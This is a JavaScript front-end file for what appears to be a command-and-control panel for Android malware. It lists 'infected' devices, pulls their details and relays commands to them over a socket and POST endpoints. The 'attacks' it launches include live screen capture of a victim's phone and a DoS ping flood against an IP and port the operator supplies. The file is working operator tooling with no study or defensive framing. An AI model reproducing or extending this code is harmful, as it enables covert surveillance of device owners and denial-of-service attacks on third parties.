const infected = document.getElementById("infected")
const infos = document.getElementById("infos")
const form = document.getElementById("left")
const imgSrc = document.querySelector("#imgSrc img")
const androidScreen = document.getElementById("imgSrc")
let CurrentDevice = ""
let CurrentAttack = ""



/* Clearing */
form.reset()
infos.innerHTML = ""





function stopAttack(){
    // STOPING CURRENT ATTACK
    if(CurrentAttack != ""){
        msgSend(CurrentDevice,CurrentAttack,"stop")
        ele = document.querySelector('input[name="attack"]:checked')
        if(ele != null){
            ele.checked = false
        }
        CurrentAttack = ""

        // console.log(CurrentAttack,ele)
    }
}

function DOS(val){
    if(val){
        // START DOS (PING) ATTACK
        if(!(pingIp.value == "" || pingPort.value == "" || pingWait.value == "  ")){
            msgSend("","ping","start",pingIp.value,pingPort.value,pingWait.value)
            pingStop.disabled = false
            pingStart.disabled = true
        }else{
            alert(42)
        }
    }else{
        msgSend("","ping","stop")
        pingStop.disabled = true
        pingStart.disabled = false
    }
}


async function getInfo(id){
    await stopAttack()
    if(id != "None"){
        $.ajax({
            url : document.location.origin+'/info',
            method : 'POST',
            type : 'POST',
            data : {
                id : id,
            },
            success : async (data)=>{
                // console.log(data)
                await stopAttack()
                CurrentDevice = id
                tmp = ""
                delete data['ID']
                for(i in data){
                    tmp += `<div class="info">
                    <span>${i} :</span>
                    <span>${data[i]}</span>
                </div>` 
                }
                infos.innerHTML = tmp
            }
        })
    }else{
        infos.innerHTML = ""
    }
}


/** Loging Particals */
// Particles.init({
//     selector: '#bgParticals',
//     color : "#ffffff",
//     connectParticles : true,
//     maxParticles : 50
// });
/** Loging Particals */



/** Making Socket Connections */
const socket = io(`ws://${document.location.hostname}:4001/`,{transports: ['websocket'], upgrade: false})
const output = document.getElementById("output")

socket.on("logger",(data)=>{
    // console.log(data)
    output.append(data+"\n")
    output.scrollTo(0,output.scrollTopMax) 
})

socket.on("img",(data)=>{
    imgSrc.src = "data:image/jpeg;charset=utf-8;base64,"+data 
})

socket.on("info",(data)=>{
    // console.log(data)
    infected.innerHTML = '<option data-display="Infected">None</option>'
    data.forEach(i=>{
        infected.insertAdjacentHTML("beforeend",`<option value="${i[0]}">${i[1]} (${i[2]})</option>`) 
    })
})


/** Making Socket Connections */



/** Functions */
function msgSend(id,emit,...args){
    $.ajax({
        url : document.location.origin+'/send',
        method : 'POST',
        type : 'POST',
        data : {
            emit : emit,
            id : id,
            args : JSON.stringify(args)
        },
        success : (data)=>{
            console.log(data)
        }
    })
}

// Function for selecting only one check box in a group
$('input[type="checkbox"]').on('change', async function() {
    if(this.checked){
        $('input[name="' + this.name + '"]').not(this).prop('checked', false);
    }

    console.log(this)
    if(CurrentAttack == "screen"){
        androidScreen.style.opacity = "0"
        androidScreen.style.pointerEvents = "none"
        rightBG.style.opacity = "1"
        output.style.opacity = "1"
    }

    await stopAttack()
    

    CurrentAttack = this.value

    if(this.checked && CurrentAttack == "screen"){
        androidScreen.style.opacity = "1"
        androidScreen.style.pointerEvents = "all"
        rightBG.style.opacity = "0"
        output.style.opacity = "0"
    }


    // console.log(CurrentDevice,this.value,"start")
    if(this.checked){
        msgSend(CurrentDevice,this.value,"start")
    }else{
        CurrentAttack = ""
    }
    
});



// function toggleAndroidScreen(bool){
    
// }


// $(document).ready(function(){
//     $('select').niceSelect()
// })



// function mail(mEmail,mSub,mBody) {
//     mSub = encodeURI(mSub)
//     mBody = encodeURI(mBody+` ${window.location.href}`)
//     window.location.href = `mailto:${mEmail}?subject=${mSub}&body=${mBody}`
// }














// async function l1(){
//     return await setTimeout(()=>{
//         console.log("a")
//     },1000)
// }

// l1().then(()=>{

//     console.log("b")
// })
